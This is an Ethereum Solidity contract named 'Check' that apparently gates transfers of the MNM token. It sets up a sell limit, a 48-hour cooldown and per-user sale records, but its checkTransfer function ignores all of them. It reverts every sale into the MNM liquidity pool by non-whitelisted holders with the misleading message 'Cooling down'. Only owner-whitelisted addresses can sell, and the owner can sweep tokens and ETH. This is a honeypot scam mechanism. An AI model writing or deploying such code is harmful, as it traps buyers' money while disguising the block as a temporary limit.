// SPDX-License-Identifier: NO LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Check is OwnableUpgradeable {
    using SafeERC20 for IERC20;

    address public constant MNM = 0x22C74D9400088F7F35eC7C591Bbd1945A14b69bc;
    address public constant MNM_LP = 0x080aD650Ce2a7b3D1B579c7eBceB59ea452748dB;

    uint256 public sellLimit;
    uint256 public coolDownTime;
    bool public isEnabled;

    mapping(address => uint256) public sold;
    mapping(address => uint256) public soldTime;
    mapping(uint256 => address) public user;
    mapping(address => bool) public whitelabel;

    function initialize() external initializer {
        __Ownable_init(_msgSender());
        sellLimit = 5e18;
        coolDownTime = 48 hours;
        isEnabled = true;
    }

    function setLimit(uint256 _sellLimit) external onlyOwner {
        sellLimit = _sellLimit;
    }

    function setWhiteLabel(address _addr) external onlyOwner {
        whitelabel[_addr] = true;
    }

    function setCoolingTime(uint256 _coolDownTime) external onlyOwner {
        coolDownTime = _coolDownTime;
    }

    function setCoolingData(
        address _user,
        uint256 _time,
        uint256 _amount
    ) external onlyOwner {
        sold[_user] = _amount;
        soldTime[_user] = _time;
    }

    function checkTransfer(
        address from,
        address to,
        uint256 amount
    ) external view {
        //only mnm coin contract
        require(_msgSender() == MNM, "Invalid sender");
        if (!whitelabel[from]) {
            if (isEnabled) {
                if (to == MNM_LP) {
                    revert("Cooling down");
                }
            }
        }
    }

    function recoverExcessToken(
        address token,
        uint256 amount
    ) external onlyOwner {
        IERC20(token).safeTransfer(_msgSender(), amount);
    }

    function recoverETH() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }

    function setEnable(bool _status) external onlyOwner {
        isEnabled = _status;
    }
}
